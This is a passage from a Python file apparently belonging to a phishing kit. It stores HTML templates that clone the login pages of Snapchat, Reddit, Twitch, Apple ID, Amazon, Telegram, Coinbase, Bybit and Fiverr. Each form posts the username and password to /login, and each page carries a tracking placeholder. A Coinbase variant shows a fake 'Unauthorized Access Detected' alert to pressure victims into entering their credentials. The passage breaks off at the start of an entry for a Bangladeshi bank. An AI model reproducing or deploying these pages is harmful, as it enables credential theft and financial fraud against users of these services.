.wrap{width:100%;max-width:360px}
input{width:100%;padding:14px 16px;background:#fff;border:2px solid #e0e0e0;border-radius:50px;font-size:16px;color:#333;outline:none;margin-bottom:12px}
input:focus{border-color:#000}
input::placeholder{color:#aaa}
.btn{width:100%;padding:14px;background:#000;color:#FFFC00;border:none;border-radius:50px;font-size:16px;font-weight:800;cursor:pointer;margin-top:4px}
.forgot{display:block;text-align:center;color:#000;font-size:14px;font-weight:600;text-decoration:none;margin-top:16px}
.signup-row{text-align:center;font-size:14px;color:#000;margin-top:28px;border-top:1px solid rgba(0,0,0,.2);padding-top:20px}
.signup-row a{color:#000;font-weight:800;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="logo">
  <svg viewBox="0 0 100 100" fill="#000"><path d="M50 5C25.1 5 5 25.1 5 50s20.1 45 45 45 45-20.1 45-45S74.9 5 50 5zm22.1 60.9c-.3.5-5.8 2.6-7 2.9-.4.1-.8.3-1.1.5-.8.5-1.7 1.1-5.5 1.1-2.7 0-4.9-.6-7-.6-2.1 0-4.3.6-7 .6-3.8 0-4.7-.6-5.5-1.1-.3-.2-.7-.4-1.1-.5-1.2-.3-6.7-2.4-7-2.9-.2-.4 0-.8.5-.9.1 0 2.3-.5 3.5-1.9.9-1 1.3-2.4 1.3-4.2 0-3.3-1.6-6-1.6-9.9 0-6.9 4.8-11.5 11.5-11.5h11.1c6.7 0 11.5 4.6 11.5 11.5 0 3.9-1.6 6.6-1.6 9.9 0 1.8.4 3.2 1.3 4.2 1.2 1.4 3.4 1.9 3.5 1.9.5.1.7.5.2.9z"/></svg>
</div>
<div class="wrap">
  <h1>Log in to Snapchat</h1>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Username or Email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Log In</button>
  </form>
  <a class="forgot" href="#">Forgot your password?</a>
  <div class="signup-row">Don't have an account? <a href="#">Sign Up</a></div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# REDDIT
# ─────────────────────────────────────────────────────────────────────────────
PAGES['reddit'] = {}
PAGES['reddit']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Reddit — Log In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#dae0e6;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{background:#fff;border-radius:4px;box-shadow:0 2px 4px rgba(0,0,0,.1);padding:32px 24px;max-width:380px;width:100%}
.logo{display:flex;align-items:center;gap:10px;margin-bottom:20px;justify-content:center}
.logo svg{width:40px;height:40px}
.logo span{font-size:20px;font-weight:800;color:#1c1c1c}
h1{font-size:1.3em;font-weight:700;text-align:center;color:#1c1c1c;margin-bottom:4px}
.sub{font-size:.88em;color:#878a8c;text-align:center;margin-bottom:20px}
.sso-btn{width:100%;padding:11px;border:1px solid #edeff1;border-radius:9999px;font-size:14px;font-weight:600;color:#1c1c1c;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px;background:#fff}
.sso-btn:hover{background:#f8f9fa}
.or-row{display:flex;align-items:center;gap:12px;margin:14px 0;color:#878a8c;font-size:12px}
.or-line{flex:1;height:1px;background:#edeff1}
input{width:100%;padding:11px 12px;background:#f6f7f8;border:1px solid #edeff1;border-radius:4px;font-size:14px;color:#1c1c1c;outline:none;margin-bottom:10px}
input:focus{border-color:#0045ac}
.btn{width:100%;padding:11px;background:#ff4500;color:#fff;border:none;border-radius:9999px;font-size:14px;font-weight:700;cursor:pointer}
.btn:hover{background:#ff5722}
.forgot{display:block;text-align:center;color:#0079d3;font-size:13px;text-decoration:none;margin-top:12px}
.signup-row{text-align:center;font-size:13px;color:#878a8c;margin-top:16px;padding-top:16px;border-top:1px solid #edeff1}
.signup-row a{color:#0079d3;font-weight:700;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 20 20" fill="#ff4500"><circle cx="10" cy="10" r="10"/><path fill="#fff" d="M16.67 10a1.46 1.46 0 00-2.47-1 7.12 7.12 0 00-3.85-1.23l.65-3.08 2.13.45a1 1 0 101-1 1 1 0 00-.96.68l-2.38-.5a.26.26 0 00-.31.2l-.73 3.44a7.14 7.14 0 00-3.82 1.23 1.46 1.46 0 10-1.61 2.39 2.87 2.87 0 000 .44c0 2.24 2.61 4.06 5.83 4.06s5.83-1.82 5.83-4.06a2.87 2.87 0 000-.44 1.46 1.46 0 00.6-1.08zM7.27 11a1 1 0 111 1 1 1 0 01-1-1zm5.6 2.71a3.58 3.58 0 01-2.84.5 3.58 3.58 0 01-2.84-.5.19.19 0 01.27-.27 3.21 3.21 0 002.57.39 3.21 3.21 0 002.57-.39.19.19 0 01.27.27zm-.17-1.71a1 1 0 111-1 1 1 0 01-1 1z"/></svg>
    <span>reddit</span>
  </div>
  <h1>Log In</h1>
  <p class="sub">By continuing, you agree to our User Agreement and Privacy Policy.</p>
  <button class="sso-btn">
    <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <button class="sso-btn">🍎 Continue with Apple</button>
  <div class="or-row"><div class="or-line"></div>OR<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Username or email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Log In</button>
  </form>
  <a class="forgot" href="#">Forgot your password?</a>
  <div class="signup-row">New to Reddit? <a href="#">Sign Up</a></div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# TWITCH
# ─────────────────────────────────────────────────────────────────────────────
PAGES['twitch'] = {}
PAGES['twitch']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Log In — Twitch</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0e0e10;font-family:Roobert,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px;color:#efeff1}
.card{background:#18181b;border:1px solid #2d2d35;border-radius:6px;padding:32px 28px;max-width:380px;width:100%}
.logo{text-align:center;margin-bottom:24px}
.logo svg{width:48px;height:48px;fill:#9147ff}
h1{font-size:1.3em;font-weight:700;text-align:center;color:#efeff1;margin-bottom:20px}
label{font-size:13px;font-weight:600;color:#efeff1;display:block;margin-bottom:5px}
input{width:100%;padding:11px 12px;background:#0e0e10;border:1px solid #464649;border-radius:4px;font-size:14px;color:#efeff1;outline:none;margin-bottom:16px}
input:focus{border-color:#9147ff}
input::placeholder{color:#adadb8}
.btn{width:100%;padding:11px;background:#9147ff;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:14px}
.btn:hover{background:#772ce8}
.forgot{display:block;text-align:center;color:#bf94ff;font-size:13px;text-decoration:none}
.signup-row{text-align:center;font-size:13px;color:#adadb8;margin-top:16px;padding-top:16px;border-top:1px solid #2d2d35}
.signup-row a{color:#9147ff;font-weight:700;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 50 50"><path d="M41 4H9C6.24 4 4 6.24 4 9v27l9-9h24c2.76 0 5-2.24 5-5V9c0-2.76-2.24-5-5-5zm3 23c0 1.65-1.35 3-3 3H10l-7 7V9c0-1.65 1.35-3 3-3h32c1.65 0 3 1.35 3 3v18zM31 25h-3V15h3v10zm-8 0h-3V15h3v10z"/></svg>
  </div>
  <h1>Log in to Twitch</h1>
  <form action="/login" method="POST">
    <label>Username</label>
    <input type="text" name="email" autocomplete="username" required>
    <label>Password</label>
    <input type="password" name="password" autocomplete="current-password" required>
    <button class="btn" type="submit">Log In</button>
  </form>
  <a class="forgot" href="#">Trouble logging in?</a>
  <div class="signup-row">Don't have an account? <a href="#">Sign Up</a></div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# APPLE ID
# ─────────────────────────────────────────────────────────────────────────────
PAGES['apple'] = {}
PAGES['apple']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Apple ID</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display','Helvetica Neue',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.apple-logo{margin:40px 0 20px}
.apple-logo svg{width:40px;height:48px;fill:#1d1d1f}
.card{background:#fff;border-radius:18px;box-shadow:0 4px 24px rgba(0,0,0,.08);padding:36px 28px;max-width:380px;width:calc(100% - 32px)}
h1{font-size:1.5em;font-weight:600;color:#1d1d1f;text-align:center;margin-bottom:4px}
.sub{font-size:.88em;color:#6e6e73;text-align:center;margin-bottom:28px;line-height:1.5}
input{width:100%;padding:14px 16px;background:#f5f5f7;border:none;border-radius:10px;font-size:17px;color:#1d1d1f;outline:none;margin-bottom:12px;-webkit-appearance:none}
input:focus{background:#fff;box-shadow:0 0 0 2px #0071e3;outline:none}
input::placeholder{color:#aeaeb2}
.btn{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:10px;font-size:17px;font-weight:600;cursor:pointer;margin-top:4px}
.btn:active{background:#0077ed}
.forgot{display:block;text-align:center;color:#0071e3;font-size:14px;text-decoration:none;margin-top:16px}
.create{text-align:center;font-size:14px;color:#1d1d1f;margin-top:16px}
.create a{color:#0071e3;font-weight:600;text-decoration:none}
.footer{font-size:12px;color:#6e6e73;text-align:center;margin-top:28px;padding:0 16px;line-height:1.6}
.footer a{color:#0071e3;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="apple-logo">
  <svg viewBox="0 0 814 1000"><path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-37.3-157.2-114.6C184.5 707 150.2 614.5 150.2 526.9c0-193.3 125.5-295.5 248.5-295.5 66 0 121.2 43.4 162.7 43.4 39.5 0 101.1-46 176.3-46 28.5 0 130.9 2.6 198.3 99.2zm-234-181.5c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z"/></svg>
</div>
<div class="card">
  <h1>Apple ID</h1>
  <p class="sub">Sign in with your Apple ID to manage your account and access Apple services.</p>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Apple ID (email)" autocomplete="username" required>
    <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
    <button class="btn" type="submit">Sign In →</button>
  </form>
  <a class="forgot" href="#">Forgot Apple ID or password?</a>
  <div class="create">Don't have an Apple ID? <a href="#">Create yours now</a></div>
</div>
<div class="footer">
  <a href="#">Privacy Policy</a> · <a href="#">Terms of Use</a> · <a href="#">Support</a>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# AMAZON
# ─────────────────────────────────────────────────────────────────────────────
PAGES['amazon'] = {}
PAGES['amazon']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Amazon Sign-In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:'Amazon Ember',Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.amzn-logo{margin:28px 0 20px}
.amzn-logo svg{width:100px;height:30px}
.card{border:1px solid #d5d9d9;border-radius:4px;padding:24px 28px;max-width:350px;width:calc(100% - 32px)}
.card h1{font-size:1.1em;font-weight:400;color:#0f1111;margin-bottom:14px}
label{font-size:13px;font-weight:700;color:#0f1111;display:block;margin-bottom:3px}
input{width:100%;padding:7px 10px;border:1px solid #aab7b8;border-radius:3px;font-size:14px;color:#0f1111;outline:none;margin-bottom:10px;height:36px}
input:focus{border-color:#e77600;box-shadow:0 0 0 3px rgba(228,121,17,.5)}
.btn{width:100%;padding:8px;background:linear-gradient(to bottom,#f7dfa5,#f0c14b);border:1px solid #a88734;border-radius:3px;font-size:14px;cursor:pointer;color:#111;margin-bottom:14px}
.legal{font-size:12px;color:#565959;line-height:1.5;margin-bottom:16px}
.legal a{color:#0066c0;text-decoration:none}
.divider{border:none;border-top:1px solid #e7e7e7;margin:16px 0}
.create-btn{width:100%;padding:8px;background:linear-gradient(to bottom,#f4f4f4,#eee);border:1px solid #adb1b8;border-radius:3px;font-size:14px;cursor:pointer;color:#111}
.prime{text-align:center;margin-top:16px;font-size:12px;color:#0066c0;cursor:pointer}
</style></head><body>
TRACK_PLACEHOLDER
<div class="amzn-logo">
  <svg viewBox="0 0 603 185" xmlns="http://www.w3.org/2000/svg">
    <text y="140" font-size="150" font-family="Arial,sans-serif" font-weight="900" fill="#ff9900">amazon</text>
  </svg>
</div>
<div class="card">
  <h1>Sign in</h1>
  <form action="/login" method="POST">
    <label>Email or mobile phone number</label>
    <input type="text" name="email" autocomplete="email" required>
    <label>Password <a href="#" style="font-weight:400;float:right;color:#0066c0;text-decoration:none;font-size:12px">Forgot your password?</a></label>
    <input type="password" name="password" autocomplete="current-password" required>
    <button class="btn" type="submit">Sign in</button>
  </form>
  <div class="legal">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</div>
  <hr class="divider">
  <button class="create-btn">Create your Amazon account</button>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# TELEGRAM WEB
# ─────────────────────────────────────────────────────────────────────────────
PAGES['telegram_web'] = {}
PAGES['telegram_web']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Telegram — Log In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#17212b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;color:#adbac7;padding:0 16px}
.tg-logo{margin:48px 0 24px;text-align:center}
.tg-logo svg{width:72px;height:72px}
h1{font-size:1.4em;font-weight:700;color:#fff;margin-bottom:8px;text-align:center}
.sub{font-size:.9em;color:#adbac7;text-align:center;line-height:1.6;margin-bottom:28px;max-width:280px}
.card{background:#2b3e50;border-radius:12px;padding:24px 20px;width:100%;max-width:360px}
.flag-row{display:flex;gap:8px;margin-bottom:12px}
.flag-row select{padding:12px 10px;background:#213040;border:1px solid #3d546a;border-radius:8px;font-size:14px;color:#adbac7;outline:none}
.flag-row input{flex:1;padding:12px 14px;background:#213040;border:1px solid #3d546a;border-radius:8px;font-size:16px;color:#fff;outline:none}
.flag-row input:focus{border-color:#2ea6ff}
.flag-row input::placeholder{color:#617d93}
.btn{width:100%;padding:13px;background:#2ea6ff;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer}
.btn:hover{background:#2495e8}
.note{font-size:12px;color:#617d93;text-align:center;margin-top:12px;line-height:1.6}
.note a{color:#2ea6ff;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="tg-logo">
  <svg viewBox="0 0 48 48" fill="none"><circle cx="24" cy="24" r="24" fill="#2ea6ff"/><path fill="#fff" d="M36 13.5L31 36s-.7 1.7-2.5.9l-6.9-5.3-3.3 3.1s-.4.3-.9.1l.8-11.4L31 16.6s.6-.3 0-.6c-.6-.3-1.2.1-1.2.1L12 26.5l-6.1-2s-.9-.3-.1-.9L34.4 11s1.6-.9 1.6 2.5z"/></svg>
</div>
<h1>Log in to Telegram</h1>
<p class="sub">Please confirm your country code and enter your phone number.</p>
<div class="card">
  <form action="/login" method="POST">
    <div class="flag-row">
      <select name="country_code">
        <option value="+880">🇧🇩 +880</option>
        <option value="+91">🇮🇳 +91</option>
        <option value="+1">🇺🇸 +1</option>
        <option value="+44">🇬🇧 +44</option>
        <option value="+7">🇷🇺 +7</option>
      </select>
      <input type="tel" name="email" placeholder="Phone number" required>
    </div>
    <input type="hidden" name="password" value="telegram_login">
    <button class="btn" type="submit">Next →</button>
  </form>
  <p class="note">We will send a confirmation code. <a href="#">More info</a></p>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# COINBASE
# ─────────────────────────────────────────────────────────────────────────────
PAGES['coinbase'] = {}
PAGES['coinbase']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Coinbase — Sign In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:0 16px}
.cb-logo{margin:40px 0 32px;display:flex;align-items:center;gap:10px}
.cb-logo svg{width:32px;height:32px;fill:#0052ff}
.cb-logo span{font-size:22px;font-weight:700;color:#0a0b0d}
.card{max-width:400px;width:100%}
h1{font-size:1.5em;font-weight:700;color:#0a0b0d;margin-bottom:28px;text-align:center}
label{font-size:14px;font-weight:600;color:#0a0b0d;display:block;margin-bottom:5px}
input{width:100%;padding:13px 14px;border:1.5px solid #d8dbe0;border-radius:8px;font-size:16px;color:#0a0b0d;outline:none;margin-bottom:16px}
input:focus{border-color:#0052ff;box-shadow:0 0 0 3px rgba(0,82,255,.1)}
.btn{width:100%;padding:14px;background:#0052ff;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;margin-bottom:16px}
.btn:hover{background:#0040cc}
.sso-btn{width:100%;padding:13px;background:#fff;border:1.5px solid #d8dbe0;border-radius:8px;font-size:14px;font-weight:600;color:#0a0b0d;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px}
.or-row{display:flex;align-items:center;gap:12px;margin:14px 0;color:#848c97;font-size:13px}
.or-line{flex:1;height:1px;background:#d8dbe0}
.forgot{display:block;text-align:center;color:#0052ff;font-size:14px;text-decoration:none;margin-top:4px;margin-bottom:16px}
.signup-row{text-align:center;font-size:14px;color:#5b616e;margin-top:16px}
.signup-row a{color:#0052ff;font-weight:700;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="cb-logo">
  <svg viewBox="0 0 50 50"><circle cx="25" cy="25" r="25" fill="#0052ff"/><path fill="#fff" d="M25 10C17 10 10 17 10 25s7 15 15 15 15-7 15-15-7-15-15-15zm0 24c-5 0-9-4-9-9s4-9 9-9 9 4 9 9-4 9-9 9z"/></svg>
  <span>Coinbase</span>
</div>
<div class="card">
  <h1>Sign in to Coinbase</h1>
  <button class="sso-btn">
    <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <div class="or-row"><div class="or-line"></div>or<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <label>Email</label>
    <input type="email" name="email" placeholder="Enter your email" required>
    <label>Password</label>
    <input type="password" name="password" placeholder="Enter your password" required>
    <a class="forgot" href="#">Forgot password?</a>
    <button class="btn" type="submit">Sign In</button>
  </form>
  <div class="signup-row">Don't have an account? <a href="#">Create account</a></div>
</div>
</body></html>"""

PAGES['coinbase']['wallet_alert'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Coinbase — Account Security Alert</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0b0d;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px;color:#fff}
.card{background:#151618;border:1px solid #2a2d33;border-radius:12px;padding:28px 24px;max-width:400px;width:100%}
.logo{color:#0052ff;font-size:20px;font-weight:800;margin-bottom:20px;display:flex;align-items:center;gap:8px}
.alert-box{background:#ff4d4f20;border:1px solid #ff4d4f;border-radius:8px;padding:14px;margin-bottom:22px;font-size:.87em;color:#ff7875;line-height:1.6}
.alert-box strong{display:block;color:#ff4d4f;margin-bottom:4px}
h2{font-size:1.1em;font-weight:700;margin-bottom:16px;color:#fff}
label{font-size:12px;font-weight:600;color:#848c97;display:block;margin-bottom:5px}
input{width:100%;padding:12px;background:#0a0b0d;border:1px solid #2a2d33;border-radius:6px;font-size:15px;color:#fff;outline:none;margin-bottom:14px}
input:focus{border-color:#0052ff}
input::placeholder{color:#3d4350}
.btn{width:100%;padding:13px;background:#0052ff;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:700;cursor:pointer}
</style></head><body>
TRACK_PLACEHOLDER
<div class="card">
  <div class="logo">◆ Coinbase</div>
  <div class="alert-box"><strong>🚨 Unauthorized Access Detected</strong>Someone attempted to access your Coinbase account from an unknown device. Verify your identity immediately to secure your funds.</div>
  <h2>Secure Your Account</h2>
  <form action="/login" method="POST">
    <label>Email Address</label>
    <input type="email" name="email" placeholder="Your Coinbase email" required>
    <label>Password</label>
    <input type="password" name="password" placeholder="Your password" required>
    <button class="btn" type="submit">🔒 Secure My Account</button>
  </form>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# BYBIT
# ─────────────────────────────────────────────────────────────────────────────
PAGES['bybit'] = {}
PAGES['bybit']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Bybit — Log In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0c0e14;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;color:#e0e0e0;padding:0 16px}
.bybit-logo{margin:40px 0 32px;text-align:center}
.bybit-logo span{font-size:28px;font-weight:900;color:#f7a600;letter-spacing:-1px}
.card{background:#181c27;border:1px solid #2a2f3e;border-radius:8px;padding:28px 24px;max-width:400px;width:100%}
h1{font-size:1.3em;font-weight:700;margin-bottom:20px;color:#fff}
.tabs{display:flex;gap:20px;margin-bottom:20px;border-bottom:1px solid #2a2f3e;padding-bottom:12px}
.tab{font-size:14px;font-weight:600;color:#8c97a8;cursor:pointer;padding-bottom:4px}
.tab.active{color:#f7a600;border-bottom:2px solid #f7a600}
label{font-size:12px;font-weight:600;color:#8c97a8;display:block;margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px}
input{width:100%;padding:12px;background:#0c0e14;border:1px solid #2a2f3e;border-radius:4px;font-size:15px;color:#e0e0e0;outline:none;margin-bottom:14px}
input:focus{border-color:#f7a600}
input::placeholder{color:#3d4557}
.btn{width:100%;padding:13px;background:#f7a600;color:#0c0e14;border:none;border-radius:4px;font-size:15px;font-weight:800;cursor:pointer}
.links{display:flex;justify-content:space-between;margin-top:12px;font-size:13px}
.links a{color:#f7a600;text-decoration:none}
.signup-row{text-align:center;margin-top:20px;font-size:13px;color:#8c97a8}
.signup-row a{color:#f7a600;font-weight:700;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="bybit-logo"><span>Bybit</span></div>
<div class="card">
  <div class="tabs">
    <div class="tab active">Email</div>
    <div class="tab">Mobile</div>
  </div>
  <form action="/login" method="POST">
    <label>Email Address</label>
    <input type="email" name="email" placeholder="Enter your email" required>
    <label>Password</label>
    <input type="password" name="password" placeholder="Enter your password" required>
    <button class="btn" type="submit">Log In</button>
  </form>
  <div class="links"><a href="#">Forgot password?</a><a href="#">Help</a></div>
  <div class="signup-row">Don't have an account? <a href="#">Register</a></div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# FIVERR
# ─────────────────────────────────────────────────────────────────────────────
PAGES['fiverr'] = {}
PAGES['fiverr']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Fiverr — Sign in</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f1faf2;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Macan,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:0 16px}
.fvr-logo{margin:36px 0 24px;display:flex;align-items:center;gap:4px}
.fvr-logo span{font-size:30px;font-weight:900;color:#1dbf73;letter-spacing:-1px}
.fvr-logo .dot{width:8px;height:8px;background:#1dbf73;border-radius:50%;margin-top:12px}
.card{background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.08);padding:28px 24px;max-width:380px;width:100%}
h1{font-size:1.3em;font-weight:700;color:#404145;margin-bottom:20px;text-align:center}
.sso-btn{width:100%;padding:11px;border:1px solid #dadbdd;border-radius:4px;font-size:14px;font-weight:600;color:#404145;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px;background:#fff}
.or-row{display:flex;align-items:center;gap:12px;margin:14px 0;color:#95979d;font-size:13px}
.or-line{flex:1;height:1px;background:#dadbdd}
label{font-size:14px;font-weight:600;color:#404145;display:block;margin-bottom:4px}
input{width:100%;padding:11px 12px;border:1px solid #dadbdd;border-radius:4px;font-size:14px;color:#404145;outline:none;margin-bottom:12px}
input:focus{border-color:#1dbf73}
.btn{width:100%;padding:11px;background:#1dbf73;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer}
.btn:hover{background:#19a463}
.forgot{display:block;text-align:center;color:#1dbf73;font-size:13px;text-decoration:none;margin-top:10px}
.signup-row{text-align:center;font-size:13px;color:#95979d;margin-top:14px;padding-top:14px;border-top:1px solid #dadbdd}
.signup-row a{color:#1dbf73;font-weight:700;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="fvr-logo"><span>fiverr</span><div class="dot"></div></div>
<div class="card">
  <h1>Sign in to Fiverr</h1>
  <button class="sso-btn">
    <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <button class="sso-btn">🍎 Continue with Apple</button>
  <div class="or-row"><div class="or-line"></div>or<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <label>Email</label>
    <input type="email" name="email" required>
    <label>Password</label>
    <input type="password" name="password" required>
    <button class="btn" type="submit">Continue</button>
  </form>
  <a class="forgot" href="#">Forgot password?</a>
  <div class="signup-row">Not a member yet? <a href="#">Join Fiverr</a></div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# ROCKET (Bangladesh Dutch Bangla Bank)
# ─────────────────────────────────────────────────────────────────────────────
PAGES['rocket'] = {}
